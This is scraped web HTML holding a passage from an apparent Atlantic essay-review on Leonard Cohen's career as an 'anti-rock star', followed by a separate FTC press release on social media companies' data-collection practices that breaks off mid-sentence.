doctorate, and one in between), and, as a lecturer at the University of Strasbourg, in France, created two college courses on him. His subtitle captures the guiding insight of his book, and is a plausible starting point: Cohen’s music is devoted to the idea that human beings are inherently fallen creatures, and therefore, as Lebold writes, “frivolity sucks; gravity heals.”</p><p data-flatplan-paragraph="true">Lebold describes his portrait, newly translated from the French, as “part biography, part analysis, and part ode,” though over 500 pages, “ode” comes to predominate. Along the way, Lebold compares Cohen to (among others) Joan of Arc, John Donne, Steve McQueen, Casanova, and King David. Garrulous excesses aside, stretches of the book are beautifully and sympathetically written, and please don’t mistake me, especially now, in 2024—love need not be the antonym of truth.</p><p data-flatplan-paragraph="true">But by the 20th or so invocation of Cohen as an “archangel,” the heartfelt panegyric starts to backfire. Cohen’s music is distinctive in its utter lack of bombast, preening, or rhetorical inflation. To my ear, the tone always presumes in the listener the presence of an equal and thus forbids the aura of cultic idealization that pervades Lebold’s book. In many respects, of course, Cohen was a garden-variety rock celebrity. He sold a lot of records (if mostly outside the United States) and, his disdain for touring notwithstanding, his life was full of the usual slurry of hotels, roadies, groupies, gurus, and drugs. But at his core, he was the antithesis of a rock star.</p><p data-flatplan-paragraph="true">I’d go further: In his music and person, he bore a kind of witness against the messianic redeemer who has dominated the Boomer entertainment complex, and who’s now the default paradigm for the winner at the top of a winner-take-all society. Over and over, Cohen slipped away unseduced, terrified that such a life would kill the muse he’d courted so assiduously as a young poet. He created an astonishing musical persona, not to mention catalog of songs, because he never lost touch with his fealty to ordinary experience, and his lonely intimacy with an immense sense of failure.</p><div data-view-action="view - affiliate module" data-view-label="Leonard Cohen: The Man Who Saw the Angels Fall" data-event-module="affiliate module"><a href="https://bookshop.org/a/12476/9781770417441" rel="noopener noreferrer" data-label="Leonard Cohen: The Man Who Saw the Angels Fall" data-action="click link - affiliate module - book cover" data-event-element="book cover" target="_blank"><picture><img alt="" loading="lazy" srcset="https://cdn.theatlantic.com/thumbor/zbI4fKwlYK8Cdz6AfQX73G39bvc=/0x0:324x500/78x120/media/img/book_reviews/2024/09/16/41WyZibjq1L._SL500_/original.jpg, https://cdn.theatlantic.com/thumbor/klNdieef6Lt7vE5OsV29aeOGcAk=/0x0:324x500/156x240/media/img/book_reviews/2024/09/16/41WyZibjq1L._SL500_/original.jpg 2x" src="https://cdn.theatlantic.com/thumbor/zbI4fKwlYK8Cdz6AfQX73G39bvc=/0x0:324x500/78x120/media/img/book_reviews/2024/09/16/41WyZibjq1L._SL500_/original.jpg" width="78" height="120"></picture></a></div><p data-flatplan-paragraph="true" data-flatplan-dropcap="true"><span>That his </span><span>music </span>sounds like nothing else in the universe is owed to the quiddity that is Leonard Cohen, no doubt, but also to an accident of timing: His career happened substantially apart from the dynamic of apotheosis and adulation that converts teenage boys with guitars into that salvific demigod, the rock star.</p><p data-flatplan-paragraph="true">Canonically speaking, the rock era unfolded as follows: <a data-event-element="inline link" href="https://archive.nytimes.com/www.nytimes.com/times-insider/2014/06/10/1956-elvis-is-introduced-to-the-nation/">Elvis Presley appeared in 1956</a> and, in a stroke, invented the rock star, established rock and roll as a dominant commercial force, and remade the inner lives of, among others, Bob Dylan (who called him “the deity supreme of rock ’n’ roll religion as it exists in today’s form”) and John Lennon (who, upon hearing “Heartbreak Hotel,” said he “thought of nothing else but rock ’n’ roll”). They then came of age and, starting in the early ’60s, turned rock and roll into rock by giving it literary and avant-garde aspirations.</p><p id="injected-recirculation-link-1" data-view-action="view link - injected link - item 2" data-event-element="injected link" data-event-position="2"><a href="https://www.theatlantic.com/entertainment/archive/2016/10/the-deadly-certainty-leonard-cohen/504674/">Read: The deadly certainty of Leonard Cohen</a></p><p data-flatplan-paragraph="true">It was a series of begats (Elvis begat the Beatles, the Beatles begat Jann Wenner, etc.) involving identity-famished teenagers and their heroes, and it soon coalesced into “the full-blown phenomenon of rock stardom” as “a career path” to emulate, the scholar David Shumway writes in <a data-event-element="inline link" href="https://bookshop.org/a/12476/9781421413921"><i>Rock Star</i></a> (2014). Cohen is absent from this narrative for one simple reason: He was the same age as Elvis.</p><p data-flatplan-paragraph="true">Cohen was born in 1934 and grew up uninfluenced by rock and roll because it didn’t exist yet. For a teenage Cohen, the guitar never took on the priapic mystique invested in it by Elvis, or Chuck Berry, or Duane Eddy. (He liked Hank Williams and Pat Boone.) His first one was a pawnshop cheapie, a nylon-stringed Spanish guitar that he learned to play at sleepaway camp, working through the rudimentary tunes in <a data-event-element="inline link" href="https://www.amazon.com/Peoples-Song-Book-Waldemar-Hille/dp/0825603587/?tag=theatl0c-20"><i>The People’s Song Book</i></a> over a summer. This was about as non–rock-and-roll a childhood as it gets.</p><p data-flatplan-paragraph="true">If anything, playing the guitar fit right into his role as sweet, pampered, well-to-do nerd. He was born in Montreal and grew up in Westmount, a predominantly English Protestant enclave in a predominantly French Catholic city. The Cohens were among the most venerable families in the area’s affluent Jewish population. In the depths of the Depression, the household employed a gardener, maid, and nanny.</p><p data-flatplan-paragraph="true">With all due respect to <a data-event-element="inline link" href="https://bookshop.org/a/12476/9780063114906"><i>I’m Your Man: The Life of Leonard Cohen</i></a>, Sylvie Simmons’s still-definitive 2011 biography, the best portrait of him is the one in his own surprisingly good debut novel, <a data-event-element="inline link" href="https://bookshop.org/a/12476/9781400033621"><i>The Favourite Game</i></a> (1963), a thinly fictionalized memoir published when he was 29. Implicit in its exquisite turns of phrase and imagistic condensations is Cohen’s future greatness as a songwriter. In remarkably few pages, he conveys the essence of his childhood, ascribing it to his alter ego, Lawrence Breavman: the early loss of his father; his sense of diminishment in the face of so prominent a social inheritance; his suspicion of a “prosaic adult world, the museum of failure”; and, most curiously, a growing dismay at what he fears are his own powers of hypnotic influence over others—a poetic power, yes, but also a demagogic one. It’s worth remembering that the defining charismatic of Cohen’s childhood was not Elvis Presley, but Adolf Hitler.</p><p data-flatplan-paragraph="true">The idea that charisma—his own especially—is ugly carries over into Breavman’s young adulthood, as into Cohen’s. At McGill University, Cohen was a star campus litterateur, and his first book of poems, published in 1956, a year after he graduated, began the process of turning him into a literary celebrity in Canada. Breavman is a literary poseur—“The world was being hoaxed by a disciplined melancholy”—taking advantage of a small pond. “Canadians are desperate for a Keats,” he says, and he begins to hate himself for servicing their need.</p><p data-flatplan-paragraph="true">But Cohen appears to have found an escape. In real life (this would be the early ’50s), he formed a country-and-western trio at McGill, though by his own admission, he was an “indifferent” talent: “I banged the chords,” he later said. “I never in a thousand years thought of myself as a musician or as a singer.” But along the way he became a nimble player, and in a style all his own, combining country with flamenco. In the novel, the guitar makes two cameos, one of them oddly moving. Breavman is in his early 20s and has agreed to entertain guests at a party, but he’s wary—he never knows whether he will play well or poorly. The risk is part of the allure. That night, he plays beautifully:</p><div><blockquote>He watches the intricate blur of his right hand and the ballet-fingers of his left hand stepping between the frets, and he wonders what connection there is between all that movement and the music in the air, which seems to come from the wood itself.</blockquote></div><p data-flatplan-paragraph="true">Breavman never seems freer than he does here, for a reason that is all but explicit: His performance is entirely detached from the machinations of literary fame that have come to define his life. The instrument itself, meanwhile, is invested with mystique, but not the crowd-mesmerizing rock-and-roll kind. When he’s done, he puts “the guitar away carefully, as though it contained the finer part of him.”</p><p data-flatplan-paragraph="true" data-flatplan-dropcap="true"><span>In 1964, </span>rock’s annus mirabilis, the year of <i>Meet the Beatles</i> and “The Times They Are a-Changin’,” Cohen won the Prix Littéraire du Québec for <i>The Favourite Game</i>, published his third volume of poetry, and sold his collected papers to the University of Toronto. He was 30, a respectable junior member of the Canadian literary establishment with a bohemian troublemaker inside struggling to get out.</p><p data-flatplan-paragraph="true">He had hung around the beatnik scene of Greenwich Village, and one biographer claims that Jack Kerouac inspired him to take up writing prose. But if <i>The Favourite Game</i> is to be believed, Cohen was a simulacrum in that subculture and knew it: a cosseted figure playing Canada’s token hipster. His third poetry collection, <a data-event-element="inline link" href="https://www.penguinrandomhouse.ca/books/29440/flowers-for-hitler-by-leonard-cohen/9780771024511"><i>Flowers for Hitler</i></a>—a parody title for a self-serious book—was a desperate attempt, he admitted, to move “from the world of the golden-boy poet into the dung-pile of the front-line writer.” His efforts were met with his first scathing reviews. (And meager paydays. “It was very difficult to pay my grocery bill,” he later said.)</p><p data-flatplan-paragraph="true">And so in 1966, now 31, he brought his guitar with him to readings. Among his earliest compositions was a curio titled “Suzanne.” A woman, a cup of tea, oranges; a river and a savior, now broken in spirit by our “wisdom” as he once was broken in body on the cross: This isn’t, as the honeyed arpeggios first hint, a troubadour’s paean to one-off sex. What begins as a Vermeer, a simple enough still life of a man and a woman, defined by an atmosphere of hovering expectancy—they’re sharing, we sense, the romance of not becoming lovers—ends as a Chagall, a dreamworld of juxtapositions linked not by linear sense, but by a mood as pervasive as it is unplaceable. And all of it is held together by a simple but spellbinding melodic lilt.</p><p data-flatplan-paragraph="true">Imagine not knowing, with this one in your pocket, whether you’re a songwriter. For now, though, Cohen had no clue. That year, through a chain of mutual connections, he found his way to Judy Collins and played “Suzanne” for her. She was already a folk-scene eminence, but she didn’t yet write her own material and felt that something was missing from a forthcoming album. Charmed by Cohen, <a data-event-element="inline link" href="https://www.rollingstone.com/music/music-news/flashback-leonard-cohen-and-judy-collins-perform-suzanne-51094/">she fell for his music and recorded “Suzanne.”</a></p><p data-flatplan-paragraph="true">Suddenly, Cohen was a songwriter. In February 1967, Collins invited him to perform at a fund-raiser in Manhattan. “From the wings I could see his legs shaking inside his trousers,” she recalled in <a data-event-element="inline link" href="https://www.amazon.com/dp/0449216624/?tag=theatl0c-20"><i>Trust Your Heart</i></a> (1987), and as soon as he started singing, he stopped; said, “I can’t go on”; and abruptly exited the stage. In a letter he wrote to his partner, Marianne Ihlen, he described how elated he’d felt, “how relieved … it had all come to nothing.”</p><p data-flatplan-paragraph="true">Another setback that the golden boy felt he needed. Then (though, tellingly, he left this out of the letter) he recovered: He returned to the stage and, together with Collins, finished the song, and brought down the house. Cohen had taken up music to escape the more sinister aspects of his own charisma, yet here he was, electrifying a crowd of 3,000. Nuanced ambivalence was getting harder to sustain.</p><p data-flatplan-paragraph="true">That spring, he auditioned for John Hammond, the Columbia Records legend who discovered Billie Holiday (as well as Count Basie, Aretha Franklin, and, later, Bruce Springsteen). Hammond found his songs “hypnotic” and offered him a contract on the spot. The recording itself proceeded in agonizing fits and starts. Tentativeness, intimacy, a fragile sense of himself as a musician—all were preserved on <i>Songs of Leonard Cohen</i>, a hushed and ravishing affair that is considered one of the finest debuts in pop history. The singsong dirges, many in waltz time, are so delicate, so self-assured and precise, but what to even call their mode? The conversational sublime? Melody, so unaccountably a product of unconscious forces, had placed his ego in abeyance, allowing a forbearing tenderness to emerge.</p><p data-flatplan-paragraph="true">The album was released in December 1967, about a month after <a data-event-element="inline link" href="https://www.rollingstone.com/music/music-features/rolling-stone-at-50-making-the-first-issue-193707/">the first issue of <i>Rolling Stone</i></a> hit newsstands, and the clash of sensibilities could hardly have been starker. To Jann Wenner, the magazine’s co-founder, rock musicians weren’t just singers. They were tutelary deities to the young, supplanting all elders. Thanks in no small part to <i>Rolling Stone</i>, the absolute veneration of the rock star was made into an acceptable attitude for young males, and with this veneration came various cults of personality (rock star as Dionysian overlord, Blakean visionary, Byronic aristo). Lebold’s book falls squarely within this lineage. At one point, he even calls Cohen his “master”—a perversely inapt way of honoring an artist who brought together the limits of the pop form with a heavyhearted embrace of the limits of the ego.</p><p data-flatplan-paragraph="true">The boys’ club over at <i>Rolling Stone </i>must have been baffled by how beautifully Cohen played to antitype: He trimmed his hair, wore exquisitely tailored suits, carried a briefcase into the studio. Nothing about the man, his music preeminently, flattered the worldview of the credulous teenager. Take “Famous Blue Raincoat,” from <i>Songs of Love and Hate</i> (1971), his third album, and one of the most beautiful and unsettling songs ever written. It opens with the singer awake in the early-morning dark, his wife asleep next to him. He’s composing a letter to someone who, for a spell, was her lover, and the song tells, in its oblique way, the story of a man who cannot separate his anger from his habits of self-blame, or from the realization that his wife liberated some part of herself when she cheated on him:</p><div><blockquote>Yes, and thanks, for the trouble you took from her eyes<br> I thought it was there for good so I never tried.</blockquote></div><p data-flatplan-paragraph="true">Here was a new possibility for rock music, one that Dylan, in his empyrean self-regard, hadn’t yet touched: to break free from the wounded grandiosities of boys. Joni Mitchell, who cited Cohen as “an early influence,” understood what he was up to from the beginning. “I remember thinking when I heard his songs for the first time that I was not worldly,” she said in an interview. “My work seemed very young and naive in comparison.”</p><p data-flatplan-paragraph="true">For Cohen, worldly maturity ushered in an altogether different woundedness, a mesmeric—and distinctly not adolescent—sadness, deep-seated and temperamental but intensified by crippling doubts about his gifts, about his singing especially. “I hated the sound of my own voice. I thought it was weak and full of self-pity,” he said later. He enjoyed celebrity status in England and parts of Europe, but his wasn’t a traditionally radio-friendly voice, which meant relative obscurity in America, the largest commercial market for recorded music. As the decade came to an end, Cohen would not have disputed the judgment that he was yet another spent force of the 1960s.</p><p data-flatplan-paragraph="true" data-flatplan-dropcap="true"><span>Cohen, lost </span><span>as a musician </span>in the early ’80s, needed, as he told an interviewer, to “resurrect not just my career but myself and my confidence as a writer and singer.” He chose to do the riskiest, most potentially dangerous thing of all: He laid aside the guitar. He flew to New York and called an old producer of his. “Leonard had this shit-eating grin on his face,” John Lissauer told Sylvie Simmons. “He had this little crap Casio synthesizer which he’d bought at … one of these camera shops for tourists, where you push your finger down on a key and it’ll play a dinky rhythm track.” Cohen sang Lissauer a new song, “Dance Me to the End of Love.”</p><p data-flatplan-paragraph="true">Something about the switch from a holy object to an impious one forced Cohen to break himself down, then rebuild himself from scratch as a songwriter. The gamble paid off in a batch of songs bracing in their freshness, the best of which arose out of an ever-shifting jumble of notebooks that he’d been poring over for years. Lissauer took charge of the music for a while, tinkering with the chords to give it some uplift, and when the time came to record, he assembled a small gospel-style choir to lift it up some more. In “Hallelujah,” he and Cohen thought they’d created a modern standard, and they believed <i>Various Positions </i>(1984) was an album that would mark Cohen’s arrival as a star in America. But once again, he was out of step with the timeline.</p><p data-flatplan-paragraph="true">In the ’80s, the entertainment business was becoming a global multimedia oligopoly dominated by a tiny handful of publicly owned players, among them CBS Records, all in pursuit of Wall Street–pleasing superstars—artists who, ideally operating across all media, could act as reliable mega-earners. Walter Yetnikoff, in charge at CBS Records, listened to the tape, hand-delivered by Cohen himself, and said, “We know you’re great, Leonard, but we don’t know if you’re any good,” and declined to release the album in the United States. That same year, 1984, Springsteen emerged as an MTV mainstay and thus an arena draw, giving CBS Records proof of concept for multiplatform synergies. “Born in the U.S.A.” became an era-defining anthem; “Hallelujah” all but disappeared.</p><p data-flatplan-paragraph="true">There was no rescaling Cohen to the ethos of bigness, as <i>rock star</i> began its semantic drift away from its musical origins toward its current “king of the heap” meaning. Having hit an all-time low in his career, Cohen worked mostly alone and often in Montreal, producing new songs still without the aid of a guitar. The pulsing menace of the synthesizer continued to suit his mood; his raspy, deep singing voice lowered further, becoming a richer, altogether stranger instrument. Pursuing a strain of prophesying (“Everybody knows that the Plague is coming / Everybody knows that it’s moving fast / Everybody knows that the naked man and woman / Are just a shining artifact of the past”), he refined his persona: part lounge lizard, part chansonnier, part ancient mariner—a man whose last delusion has been shed. In 1988, at an age when most rock auteurs have long since fallen back on self-plagiarism, he put out <i>I’m Your Man</i>.</p><p data-flatplan-paragraph="true">If a rock star is someone who gets arrested, developmentally speaking, in their early 20s after being mistaken for a demigod, then sells to a mass audience a fantasy of being a teenager forever, Cohen emerged with <i>I’m Your Man</i> as the perfect counterpoint. There was no aging out of being Leonard Cohen, only aging into. He was ready to bear a special kind of witness. Throughout the record, scorn is directed at specific targets—the rich, the bigots, those criminally indifferent to the AIDS crisis, the perpetrators of the Holocaust—but overall, this is an After Times document. The flood has happened. “I got some sense that the thing has been destroyed and is lost,” he told an interviewer; “this is the shadow, this is the fallout, the residue, the dust of some catastrophe, and there’s nothing to grasp onto.”</p><p data-flatplan-paragraph="true">Here, Cohen’s timing was finally apt. A considerable portion of the music-buying public was now ready for someone to testify against a society remade to suit a child’s ideal of adult self-realization. (All the seigneurial privileges, none of the responsibilities. What’s not to love?) Cohen’s witness had a special trenchancy for being levied against himself as much as anyone—against a man who, in erratic jags, had for decades flirted with, fled, returned to, and fled again the temptations of stardom.</p><p data-flatplan-paragraph="true">And then, the irony of ironies: In late middle age, he became a rock star by standing in pitiless opposition to the type. <i>I’m Your Man</i> was his most commercially successful album, and from there the irony compounded further. A proliferation of tribute albums and cover versions of songs (by the Pixies, R.E.M., and Nick Cave, among others) was already making Cohen relevant to younger audiences when Kurt Cobain, bearer of every last hope for rock and roll as a genre, <a data-event-element="inline link" href="https://www.rollingstone.com/music/music-features/leonard-cohen-on-sunshine-his-love-life-and-kurt-cobains-suicide-100924/">name-checked him in a song in 1993</a>. And in 1994, Jeff Buckley recorded “Hallelujah.”</p><p id="injected-recirculation-link-2" data-view-action="view link - injected link - item 3" data-event-element="injected link" data-event-position="3"><a href="https://www.theatlantic.com/culture/archive/2022/07/leonard-cohen-hallelujah/661461/">Read: Leonard Cohen’s “Hallelujah” belongs to everyone</a></p><p data-flatplan-paragraph="true">To sing praise to God is to praise the God we’ve got, with the larynx he gave us; from the evidence that Cohen presented in his version of the song, neither deity nor voice is kind or forgiving. But Buckley, a virtuoso rock performer, possessed a soaring vocal range, supple across multiple octaves and able to achieve euphoric liftoff without the aid of angelic overdubs. Pitting his own tendency toward over-reverence against Cohen’s self-undercutting ironies, he achieved an improbable gestalt, and turned a song from a half-forgotten Cohen album into <a data-event-element="inline link" href="https://www.theatlantic.com/culture/archive/2022/07/leonard-cohen-hallelujah/661461/">the modern standard</a> that John Lissauer had hoped for.</p><p data-flatplan-paragraph="true">Cohen was now a kind of double figure—the man turning into a timeless icon for having written “Hallelujah,” and his shadow, a man unafraid of personifying, for his growing fan base, the realities of aging and death. These two Cohens—the rock star and the anti–rock star—came together on the 2008 tour to make a single performer, a man sufficiently liberated, at last, from remorse to lean into the maudlin sorcery of “Hallelujah.” Watching the clips now, I’m struck that he is saying something moving in its generosity: <i>Yes, it’s nice to play this arena. But these are, and have always been, songs from a room; eye-level songs. They can take or leave you, and you can take or leave them. And that is why, big as I may be now, as I may yet become, I will remain forever scaled to nothing but your love and respect.</i></p><p data-flatplan-paragraph="true">His celebrity grew bigger, his witness-bearing more lucid, ever less self-regarding and only more humane. In October 2016, he released <i>You Want It Darker</i>, a farewell album, and it was greeted with universal acclaim, winning Cohen a Grammy Award for Best Rock Performance. The title cut, with its “<i>Hineni</i>, <i>hineni</i> / I’m ready, my Lord” chorus, has been commonly interpreted as a gesture of completion and peace.</p><p data-flatplan-paragraph="true">But <i>hineni</i> (Hebrew for “Here I am”) is Abraham’s response when God asks him to sacrifice Isaac, his only son. Never forget, Leonard Cohen was a Cohen—which is to say, a Kohen—a descendant, as he was told as a child, of Aaron, the older brother of Moses. He didn’t trace his existence as a musician to Elvis, but to the <a data-event-element="inline link" href="https://www.theatlantic.com/entertainment/archive/2016/11/leonard-cohen/508157/">liturgies of the synagogue</a>, which, when he was a boy, “sent shivers down my spine.” His songs were love songs in the deepest sense: gestures of reconciliation with the mystery of Creation, and the painful anomaly of human consciousness within it.</p><p id="injected-recirculation-link-3" data-view-action="view link - injected link - item 4" data-event-element="injected link" data-event-position="4"><a href="https://www.theatlantic.com/entertainment/archive/2016/11/leonard-cohen/508157/">Read: Leonard Cohen, Judaism’s bard</a></p><p data-flatplan-paragraph="true">In addition to its aura of spiritual magnanimity, then, “You Want It Darker” offers up a ferocious lament, and it has taken on a distinctly prophetic cast over the years. Leonard Cohen died on November 7, 2016. His lifelong battle with a particular kind of shameless male grandiosity was over. The following day, Donald Trump—a “rock star” politician, he’s been called—was elected president of the United States.</p><div><blockquote><p>If you are the dealer, let me out of the game<br> If you are the healer, I’m broken and lame<br> If thine is the glory, mine must be the shame<br> You want it darker</p> <p><em>Hineni, hineni<br> Hineni, hineni</em><br> I’m ready, my Lord.</p></blockquote></div><hr><p data-flatplan-paragraph="true"><small><i>This article appears in the </i><a data-event-element="inline link" href="https://www.theatlantic.com/magazine/toc/2024/10/"><i>October 2024</i></a><i> print edition with the headline “The Anti–Rock Star.” </i></small></p><div><hr><p>​When you buy a book using a link on this page, we receive a commission.

<div id="readability-page-1" class="page"><div><p>A new Federal Trade Commission staff report that examines the data collection and use practices of major social media and video streaming services shows they engaged in vast surveillance of consumers in order to monetize their personal information while failing to adequately protect users online, especially children and teens.</p><p>The <a href="https://www.ftc.gov/reports/look-behind-scenes-examining-data-practices-social-media-video-streaming-services">staff report</a><strong> </strong>is based on responses to <a href="https://www.ftc.gov/news-events/news/press-releases/2020/12/ftc-issues-orders-nine-social-media-video-streaming-services-seeking-data-about-how-they-collect-use">6(b) orders</a> issued in December 2020 to nine companies including some of the largest social media and video streaming services: Amazon.com, Inc., which owns the gaming platform Twitch; Facebook, Inc. (now Meta Platforms, Inc.); YouTube LLC; Twitter, Inc. (now X Corp.); Snap Inc.; ByteDance Ltd., which owns the video-sharing platform TikTok; Discord Inc.; Reddit, Inc.; and WhatsApp Inc.</p><p>The orders asked for information about how the companies collect, track and use personal and demographic information, how they determine which ads and other content are shown to consumers, whether and how they apply algorithms or data analytics to personal and demographic information, and how their practices impact children and teens.</p>
<article>
  </article><p>“The report lays out how social media and video streaming companies harvest an enormous amount of Americans’ personal data and monetize it to the tune of billions of dollars a year,” said FTC Chair Lina M. Khan. “While lucrative for the companies, these surveillance practices can endanger people’s privacy, threaten their freedoms, and expose them to a host of harms, from identify theft to stalking. Several firms’ failure to adequately protect kids and teens online is especially troubling. The Report’s findings are timely, particularly as state and federal policymakers consider legislation to protect people from abusive data practices.”</p><p>The report found that the companies collected and could indefinitely retain troves of data, including information from data brokers, and about both users and non-users of their platforms. The staff report further highlights that many companies engaged in broad data sharing that raises serious concerns regarding the adequacy of the companies’ data handling controls and oversight. In particular, the staff report noted that the companies’ data collection, minimization and retention practices were “woefully inadequate.” In addition, the staff report found that some companies did not delete all user data in response to user deletion requests.</p><p>The staff report also found that the business models of many of the companies incentivized mass collection of user data to monetize, especially through targeted advertising, which accounts for most of their revenue. It further noted that those incentives were in tension with user privacy, and therefore posed risks to users’ privacy. Notably, the report found that some companies deployed privacy-invasive tracking technologies, such as pixels, to facilitate advertising to users based on preferences and interests.</p><p>Additionally, the staff report highlighted the many ways in which the companies fed users’ and non-users’ personal information into their automated systems, including for use by their algorithms, data analytics, and AI. The report found that users and non-users had little or no way to opt out of how their data was used by these automated systems, and that there were differing, inconsistent, and inadequate approaches to monitoring and testing the use of automated systems.</p><p>Furthermore, the staff report concluded that the social media and video streaming services didn’t adequately protect children and teens on their sites. The report cited research that found social media and digital technology contributed to negative mental health impacts on young users.</p><p>Based on the data collected, the staff report said many companies assert that there are no children on their platforms because their services were not directed to children or did not allow children to create accounts. The staff report noted that this was an apparent attempt to avoid liability under the <a href="https://www.ftc.gov/business-guidance/resources/childrens-online-privacy-protection-rule-not-just-kids-sites">Children’s Online Privacy Protection Act Rule</a>. The staff report found that the social media and video streaming services often treated teens the same as adult users, with most companies allowing teens on their platforms with no account restrictions.</p><p>The report also noted some of the potential competition implications of the companies’ data practices. It noted that companies that amass significant amounts of user data may be in a position to achieve market dominance, which may lead to harmful practices with companies prioritizing acquiring data at the expense of user privacy. It noted that when there is limited competition among social media and video streaming services, consumers will have limited choices.</p><p>The staff report makes recommendations to policymakers and companies based on staff’s observations, findings, and analysis, including:</p><ul><li>Congress should pass comprehensive federal privacy legislation to limit surveillance, address baseline protections, and grant consumers data rights;</li><li>Companies should limit data collection, implement concrete and enforceable data minimization and retention policies, limit data sharing with third parties and affiliates, delete consumer data when it is no longer needed, and adopt consumer-friendly privacy policies that are clear, simple, and easily understood;</li><li>Companies should not collect sensitive information through privacy-invasive ad tracking technologies;</li><li>Companies should carefully examine their policies and practices regarding ad targeting based on sensitive categories;</li><li>Companies should address the lack of user control over how their data is used by systems as well as the lack of transparency regarding how such systems are used, and also should implement more stringent testing and monitoring standards for such systems; Companies should not ignore the reality that there are child users on their platforms and should treat COPPA as representing the minimum requirements and provide additional safety measures for children;</li><li>The Companies should recognize teens are not adults and provide them greater privacy protections; and</li><li>Congress should pass federal privacy legislation to fill the gap in privacy protections provided by COPPA for teens over the age of 13.</li></ul><p>The Commission voted 5-0 to issue the staff report. <a href="https://www.ftc.gov/legal-library/browse/cases-proceedings/public-statements/statement-chair-lina-m-khan-regarding-social-media-video-streaming-service-providers-privacy-report">Chair Khan</a>, as well as Commissioners <a href="https://www.ftc.gov/legal-library/browse/cases-proceedings/public-statements/statement-commissioner-alvaro-m-bedoya-6b-report-examining-data-practices-social-media-video">Alvaro Bedoya</a>, <a href="https://www.ftc.gov/legal-library/browse/cases-proceedings/public-statements/concurring-dissenting-statement-commissioner-melissa-holyoak-regarding-social-media-video-streaming">Melissa Holyoak</a> and <a href="https://www.ftc.gov/legal-library/browse/cases-proceedings/public-statements/concurring-dissenting-statement-commissioner-andrew-n-ferguson-regarding-social-media-video">Andrew N.
